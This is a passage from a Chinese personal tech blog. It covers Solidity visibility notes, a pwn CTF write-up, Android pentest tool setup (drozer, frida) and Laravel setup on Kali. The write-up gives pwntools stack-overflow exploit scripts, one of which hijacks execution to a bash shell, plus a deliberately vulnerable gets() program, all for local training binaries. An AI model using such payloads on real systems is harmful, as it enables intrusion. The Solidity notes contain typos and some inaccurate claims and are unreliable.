<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= 0.4.0 &lt; 0.6.0;</span><br><span class="line">contract test&#123;</span><br><span class="line">    function  a() external &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function b() public &#123;</span><br><span class="line">        a();  //此时会报错</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    contract ext&#123;</span><br><span class="line">        function callA(test tmp) public &#123;</span><br><span class="line">            tmp.a();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>public</strong>  </li>
</ul>
<p>&emsp;&emsp;public的特点是，函数既可以以internal方式调用，也可以用internal方式调用。public函数可以被外部接口访问，是合约对外接口的一部分。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= 0.4.0 &lt; 0.6.0</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    function fun1() public&#123;&#125;</span><br><span class="line"></span><br><span class="line">    funciton fun2() public &#123;</span><br><span class="line">        fun1();</span><br><span class="line">        this.fun2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;可以看到没有报错，既然public这么舒服，那为啥我还要用external？？？  </p>
<p>&emsp;&emsp;经过对比后我们可以发现，external方法消耗的gas要比public少，因为Solidity在调用public函数时会将代码复制到EVM的内存中，而external则是以calldata的方式进行调用的。内存分配在EVM中是十分宝贵的，而读取calldata则十分廉价，因此在处理大量外部数据，并反复调用函数时，应当考虑用external方法。  </p>
<p>&emsp;&emsp;这里应当注意的是，public属于可见性。函数的可见性分为四种：<strong>public private internal external</strong> .  </p>
<ul>
<li><strong>private</strong>  </li>
</ul>
<p>&emsp;&emsp;对于private，与internal的区别是，private的方法在子类中无法调用，即使被声明为private也不能阻止数据的查看。访问权限仅仅是限制其他合约对函数的访问和数据修改的权限。而private方法也默认以internal的方式调用。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= 0.4.0 &lt; 0.6.0;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    function fun1() private&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function fun2() public&#123;</span><br><span class="line">        fun1();</span><br><span class="line">        //this.fun1()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//合约的继承为is，这一点很容易理解，如果你明白设计模式的话，实际上继承是A is B 的关系,我很喜欢这种写法。</span><br><span class="line"></span><br><span class="line">contract ext is test&#123;   </span><br><span class="line">    function callFun() public &#123;</span><br><span class="line">        //fun1();   </span><br><span class="line">        fun2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里我们可以明确的看到private的效果，和internal类似，但是代价会更大。  </p>
<p>&emsp;&emsp;然而 <strong>public</strong> 与 <strong>private</strong> 还可以被作用于其他的变量，用于设置外部访问权限。  </p>
<p>&emsp;&emsp;请大家务必不要弄混 <strong>调用方式</strong> 与 <strong>可见性(visable)</strong> 。  </p>
<ul>
<li><strong>this</strong> </li>
</ul>
<p>&emsp;&emsp;在Solidity中，this与其他高级语言意义不同，这里的this指的是当前合约的一个实例化对象，而并不是只的合约本身，this可以理解为实现external调用的一种方式，在初始化未完成时强制调用external类型方法。而并不能指代当前合约类型。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= 0.4.0 &lt; 0.6.0;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    function fun1() external&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function fun2() public&#123;</span><br><span class="line">        this.fun1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ul>
<li><strong>getter</strong>  </li>
</ul>
<p>&emsp;&emsp;编译器会为公共状态变量提供一个getter(访问器)函数，对mapping和数组以及枚举类型也提供了对应的getter，mapping的key 数组的下标 枚举的名都具有getter，访问器的visable为external。  </p>
<hr>
<h4 id="2-关于-view-pure-constant"><a href="#2-关于-view-pure-constant" class="headerlink" title="2. 关于 view pure constant"></a>2. 关于 view pure constant</h4><p>&emsp;&emsp;在0.4.1之前只有constant这一种可爱的语法，就是有一些屁事很多的人觉得constant指的是变量，作用于函数不太合适，所以就把constant拆成了view和pure。  </p>
<p>&emsp;&emsp;在Solidity中，<strong>constant view pure</strong> 的作用是告诉编译器，函数 <strong>不改变</strong>，<strong>不读取</strong>状态变量，这样一来函数的执行就不再消耗gas了，因为不再需要矿工去验证。  </p>
<p>&emsp;&emsp;然而这三个东西有点有意思，在官方文档中用 <strong>restrictive</strong> 这一词来对函数的严格性进行描述，在函数类型转换时对严格行有一定的要求，高严格性函数可以被转化为低严格性函数：  </p>
<ul>
<li><p><strong> pure </strong> 类型可被转化为 <strong>view</strong> 和 <strong>non-payable</strong> 函数  </p>
</li>
<li><p><strong>view</strong> 类型可被转化为 <strong>non-payable</strong> 函数  </p>
</li>
<li><p><strong>payable</strong> 类型可被转化为 <strong>non-payable</strong> 函数  </p>
</li>
</ul>
<p>&emsp;&emsp;真是令人头秃！</p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/toutu.jpg?raw=true" alt="toutu">  </p>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-02-13</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2019/02/13/pwn-write-up/">pwn_write_up</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="一些pwn题的write-up"><a href="#一些pwn题的write-up" class="headerlink" title="一些pwn题的write_up"></a>一些pwn题的write_up</h3><p>&emsp;&emsp;pwn题就是好玩,做了几道题，写一波writeUp。<br>&emsp;&emsp;点击标题可下载题目。  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_0.jpeg?raw=true" alt="alias">  </p>
<h4 id="1-crackme0x00"><a href="#1-crackme0x00" class="headerlink" title="1. crackme0x00"></a><a href="https://github.com/Explainaur/hexo-blog/blob/master/source/file/bin-linux/crackme0x00" target="_blank" rel="noopener">1. crackme0x00</a></h4><p>&emsp;&emsp;首先我们把这玩意扔到radare2里，先逆了再说。<br>&emsp;&emsp;看了一下main()大概长着个样子：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_1.png?raw=true" alt="main">  </p>
<p>&emsp;&emsp;然后下面的分支大概长这个样子：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_2.png?raw=true" alt="brench">  </p>
<p>&emsp;&emsp;大概意思就是，假如我输入的字符串等于250382就算我成功了。本身到这里其实题目已经做完了，但是为了实践stackoverflow，我们要用厉害的方法。</p>
<p>&emsp;&emsp;我们可以看到有一个局部变量 <strong>char *s1 @ ebp-0x18</strong> 这说明这个字符串距离栈基址有 <strong>0x18 (24byte)</strong> 这么远.那么此时 <strong>s1</strong> 就距离 <strong>return_address</strong> 有 0x18+4 这么远.这个时候，我们就可以做一些恶心的事情，比如：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *   </span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./crackme0x00'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + <span class="string">'bbbb'</span> + p32(<span class="number">0x8048480</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;我们这样构造payload的原因是，我们希望 <strong>return</strong> 的地址是我们想要的指令.我们前面输入了一堆aaa和bbbb这是为啥嘞？24个a为了填充s1与esp的值的间隔，而4个b则是为了恰好覆盖ebp.<br>&emsp;&emsp;这样一来，后面的 <strong>p32(0x8048480)</strong> 就恰好存到了return_address的位置，也就起到了我们要的劫持指令的效果。结果长下面这样：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_3.png?raw=true" alt="result">  </p>
<h4 id="2-ret2text"><a href="#2-ret2text" class="headerlink" title="2. ret2text"></a><a href="https://github.com/Explainaur/hexo-blog/blob/master/source/file/ret2text" target="_blank" rel="noopener">2. ret2text</a></h4><p>&emsp;&emsp;这个题稍微有点难度，我们用r2先逆为敬.<br>&emsp;&emsp;main()大概长下面这样：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_4.png?raw=true" alt="main">  </p>
<p>&emsp;&emsp;我们可以看到里面有 <strong>gets()</strong> 函数，这个东西是坨垃圾，他不限制输入的长度，所以很有可能把缓冲区怼爆，所以我们就想法子日这个函数。<br>&emsp;&emsp;我们看到里面有个局部变量 <strong>char *s @ esp+0x1c</strong> ,gets()函数的值就存在s里面。这个时候我们不禁萌生了一些猥琐的想法。<br>&emsp;&emsp;我们接着看其他还有啥函数，毕竟main()里没有好利用的东西，这个时候我们发现了 <strong>sym.secure</strong> 这个函数：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_5.png?raw=true" alt="sym.secure">  </p>
<p>&emsp;&emsp;我们仔细看了一下发现，果然里面有见不得人的东西，它调用了 <strong>system(“/bin/bash”)</strong>,这我们还能说什么，直接跳转到 <strong>0x0804863a</strong> 日了他完事。下面就是愉快的编写payload，我灵机一动发现事情并不简单，这个局部变量并不是基于 <strong>ebp</strong> 的偏移地址，而是基于 <strong>esp</strong> 栈顶指针给出的，不知道他用了什么妖术。这样的话我们只好用gdb动态调试：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_6.png?raw=true" alt="gdb">  </p>
<p>&emsp;&emsp;我们在<strong>gets()</strong>那里打上断点，然后看一下寄存器的值：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$esp -&gt; 0xffffd030</span><br><span class="line"></span><br><span class="line">$ebp -&gt; 0xffffd0b8</span><br><span class="line"></span><br><span class="line">s @ $esp+0x1c -&gt; 0xffffd04c</span><br><span class="line"></span><br><span class="line">($ebp - s) -&gt; 0xfffd0b8 - 0xffffd04c = 0x6c</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;一顿帅气操作我们已经得到了s基于<strong>ebp</strong>的偏移地址，下面我们就愉快的写payload：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *    </span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2text'</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x0804863a</span>  </span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x6c</span> + <span class="string">'bbbb'</span> + p32(target)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload) </span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;下面就是我们的结果：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_7.png?raw=true" alt="result">  </p>
<h4 id="3-babyPwn"><a href="#3-babyPwn" class="headerlink" title="3. babyPwn"></a><a href="https://github.com/Explainaur/hexo-blog/blob/master/source/file/1" target="_blank" rel="noopener">3. babyPwn</a></h4><p>&emsp;&emsp;这个题就比较简单了，程序也是我自己写的，下面是源码：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;   </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You Hava already controlled it."</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">12</span>];        </span><br><span class="line">    gets(s);           </span><br><span class="line">    <span class="built_in">puts</span>(s);           </span><br><span class="line">    <span class="keyword">return</span>;            </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    vulnerable();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;          </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;直接逆,main()和sym.vulnerable()大概下面这样：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_8.png?raw=true" alt="main&amp;vulnerable">  </p>
<p>&emsp;&emsp;这个逻辑也比较简单，我们看main()里面好像啥也没有，接着看<strong>vulnerable()</strong>里面又出现了gets()这种东西，好了怼他，我们看到这个局部变量<strong>char s @ ebp-0x14</strong>中规中矩，给的也是基于 <strong>ebp</strong> 的偏移地址。<br>&emsp;&emsp;接着我们看一看别的函数，里面有个醒目的 <strong>sym.success</strong> 是结果没跑了，一看长这样：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_9.png?raw=true" alt="sym.success">  </p>
<p>&emsp;&emsp;那我们就直接把success()的地址放在vulnerable()的返回值那里，让他直接跳转，思路清晰，下面愉快的写payload：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./1'</span>)</span><br><span class="line"></span><br><span class="line">success_addr = <span class="number">0x08049172</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">20</span> + <span class="string">'bbbb'</span> + p32(success_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p32(success_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;然后结果就长这个样子：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_10.png?raw=true" alt="result">  </p>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>&emsp;&emsp;总之，我认为pwn是入侵的最高境界，是一种暴力美学，如果说web能拿到一些主机的权限，那么pwn能拿到世界上所有主机的权限。<br>&emsp;&emsp;漏洞的利用千奇百怪，绝不要被教条束缚了头脑，始终忘不了第一次见到如此简洁的shellcode时的惊讶。二进制就像魔法，我就是寻求刺激的魔法师。<br>&emsp;&emsp;以上三道题目是入门题，我要走的路还很长。</p>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-01-17</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2019/01/17/测试环境的搭建/">测试环境的搭建</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <p>&emsp;&emsp;到了公司以后，目前在学习android客户端的渗透测试。在看过用例之后觉得也不很难，主要是搭环境是真的恶心，反正windows下就是各种不顺，还是linux比较方便。记录一下各种工具的安装和使用把。  </p>
<h3 id="drozer的安装"><a href="#drozer的安装" class="headerlink" title="drozer的安装"></a>drozer的安装</h3><hr>
<p>&ensp;&emsp;在linux下安装是真的顺畅,首先要安装python——wheel的环境，至于这是个啥目前我还不太清楚： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mwrlabs/drozer/</span><br><span class="line"></span><br><span class="line">cd drozer</span><br><span class="line"></span><br><span class="line">python setup.py bdist_wheel</span><br></pre></td></tr></table></figure>
<p>&nbsp;然后就可以pip install了  </p>
<h4 id="注意，pip3还是pip取决于python环境"><a href="#注意，pip3还是pip取决于python环境" class="headerlink" title="注意，pip3还是pip取决于python环境"></a>注意，pip3还是pip取决于python环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install drozer</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;当然了你也可以直接去github上直接git clone。<br>&emsp;&emsp;到这里，电脑端的drozer就安装完成了，接下来我们要安装移动测试端的agent.apk<br>&emsp;&emsp;这里我们要去<a href="https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk" target="_blank" rel="noopener">drozer_agent.apk</a>去下载agent.apk,然后用adb直接安装就好了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install drozer-agent-2.x.x.apk</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;好了，到这里安装已经结束了，接下来我们测试以下，首先我们要开启端口转发：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:31415 tcp:31415</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;然后，在手机端打开drozer的开关  </p>
<p><img src="https://raw.githubusercontent.com/Explainaur/hexo-blog/master/source/pictures/Screenshot_20190117-104036.jpg" alt="agent.apk"></p>
<p>&emsp;&emsp;接下来我们要通过drozer console 来连接手机：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drozer console connect ---server ip_of_your_phone</span><br><span class="line"></span><br><span class="line">注意：这里是使用真机测试 所以后面要加上手机的ip做参数，</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;假如你使用的是模拟器，就可以直接:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drozer console connect</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/Explainaur/hexo-blog/master/source/pictures/drozer.png" alt="drozer_console"></p>
<p>&emsp;&emsp;好了，到此为止已经测试完成了</p>
<p>&emsp;&emsp;其实直接输入drozer就能得到提示，人家的文档写的还是很不错的，用法以后再补。</p>
<h3 id="frida的安装"><a href="#frida的安装" class="headerlink" title="frida的安装"></a>frida的安装</h3><p>&emsp;&emsp;frida是一个很牛逼的框架，能hook能注入反正就是各种牛逼，我目前还不太熟悉android，所以高级操作我也不会。<br>&emsp;&emsp;这个东西嘛，反正我在windows下是各种崩，所以直在linux下安装了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首先要安装python3</span><br><span class="line"></span><br><span class="line">pip install frida-tools</span><br><span class="line"></span><br><span class="line">pip install frida</span><br><span class="line"></span><br><span class="line">npm install frida</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;这个三条命令一输，完事儿。(垃圾windows</p>
<p>&emsp;&emsp;然后去<a href="https://github.com/frida/frida/releases" target="_blank" rel="noopener">这里</a>下载frida的客户端  </p>
<h4 id="注意，一定要下载对应的版本号，要与电脑断相同"><a href="#注意，一定要下载对应的版本号，要与电脑断相同" class="headerlink" title="注意，一定要下载对应的版本号，要与电脑断相同"></a>注意，一定要下载对应的版本号，要与电脑断相同</h4><p>&emsp;&emsp;然后用adb把frida-server安装到手机并运行，然后我们测试一下： </p>
<p><img src="https://raw.githubusercontent.com/Explainaur/hexo-blog/master/source/pictures/frida.png" alt="frida-ps -U"></p>
<p>&emsp;&emsp;好了，到此为止frida搭建完毕。</p>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2018-12-12</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2018/12/12/laravel-with-kali/">Laravel with kali</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="记录一下在Kali下如可搭建Laravel环境"><a href="#记录一下在Kali下如可搭建Laravel环境" class="headerlink" title="记录一下在Kali下如可搭建Laravel环境"></a>记录一下在Kali下如可搭建Laravel环境</h3><hr>
<p>&emsp;&emsp;我的天呐,<strong>Kali</strong>安装个<strong>Laravel</strong>是真的难,不是权限问题就是依赖问题,统一记录一下吧.<br>&emsp;&emsp;首先要新建一个普通用户<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">useradd -m dyf -s zsh -d /home/dyf </span><br><span class="line">passwd  dyf                                             //然后就输入密码</span><br><span class="line">usermod                                                 //可修改用户状态</span><br><span class="line">userdel                                                 //可删除用户</span><br><span class="line">visudoers 将用户加入sudoers</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;关于<strong>useradd</strong>的参数用法:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-c comment 指定一段注释性描述。</span><br><span class="line">-d 目录 指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录。</span><br><span class="line">-g 用户组 指定用户所属的用户组。</span><br><span class="line">-G 用户组，用户组 指定用户所属的附加组。</span><br><span class="line">-s Shell文件 指定用户的登录Shell。</span><br><span class="line">-u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;接着是最恶心的部分,安装<strong>php</strong>依赖:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y libapache2-mod-php7.0</span><br><span class="line">sudo apt-get install -y php7.0-mysql</span><br><span class="line">sudo apt-get install php7.2-zip</span><br><span class="line">sudo apt-get install php-common php-mbstring php-xml php-zip php-json php-mcrypt</span><br><span class="line">sudo apt-get install php-mbstring</span><br><span class="line">sudo apt install libapache2-mod-php</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;弄完了这么一堆恶心的东西之后,心态差了许多.<br>&emsp;&emsp;现在开始我们已经可以真正开始了.第一步是安装<strong>php</strong>的包管理<strong>composer</strong>:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">suod apt upgrade</span><br><span class="line">sudo apt install -y composer</span><br><span class="line">composer                       //此时有参数选项则安装成功</span><br><span class="line">sudo chmod 777 /home/dyf                                  //增加写入权限</span><br><span class="line">composer config -g repo.packagist composer https://packagist.laravel-china.org   //更换composer源</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;此时<strong>composer</strong>已经安装完毕,下面开始正式安装Laravel:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">composer global require "laravel/installer"</span><br><span class="line">PATH=$PATH:/home/dyf/.config/composer/vendor/bin        //修改为全局变量</span><br></pre></td></tr></table></figure></p>
<p>到这里已经差多完了,缺啥东西自己去<strong>stackoverflow</strong>上面查吧,心力憔悴.<br>然后嘞,你需要去修改<code>/etc/apache2/sites-aviliable/000-default.conf</code>把默认路径改一下.<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist laravel/laravel</span><br><span class="line">chmod -R 777 public storage bootstrap                             //给权限</span><br><span class="line">vim /etc/apache2/apache2.conf                  //找到'/var/www'将AllowOverride改为all</span><br><span class="line">sudo a2enmod rewrite                           //开启重写模式</span><br><span class="line">composer install</span><br><span class="line">composer update</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;接着为新项目建立一个新的mysql账户,一定要安装php7.x-mysqli的包,否则 mysqliconnect() 将无法使用.安装php-curl</p>
<p>&emsp;&emsp;开始干活吧.</p>
<h6 id="ps-我不小心重装了系统，结果又蹦了，首先是apache，接着是php版本冲突要用a2enmod-php7-修改。"><a href="#ps-我不小心重装了系统，结果又蹦了，首先是apache，接着是php版本冲突要用a2enmod-php7-修改。" class="headerlink" title="ps:我不小心重装了系统，结果又蹦了，首先是apache，接着是php版本冲突要用a2enmod php7.*修改。"></a>ps:我不小心重装了系统，结果又蹦了，首先是apache，接着是php版本冲突要用a2enmod php7.*修改。</h6><h5 id="我又双重装了系统，这次提供的node版本是11-0-根本不支持之前的版本，踏马只能用-npm-rebuild-node-sass-–force-回滚原先的版本。"><a href="#我又双重装了系统，这次提供的node版本是11-0-根本不支持之前的版本，踏马只能用-npm-rebuild-node-sass-–force-回滚原先的版本。" class="headerlink" title="我又双重装了系统，这次提供的node版本是11.0,根本不支持之前的版本，踏马只能用 npm rebuild node-sass –force 回滚原先的版本。"></a>我又双重装了系统，这次提供的node版本是11.0,根本不支持之前的版本，踏马只能用 <strong>npm rebuild node-sass –force</strong> 回滚原先的版本。</h5>
        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2018-12-02</span>
          
            
              <span class="post-category"><a href="/categories/C/">C</a></span>
            
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2018/12/02/对C结构的理解/">对C结构的理解</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="记录一下学习C结构的想法"><a href="#记录一下学习C结构的想法" class="headerlink" title="记录一下学习C结构的想法"></a>记录一下学习C结构的想法</h3><hr>
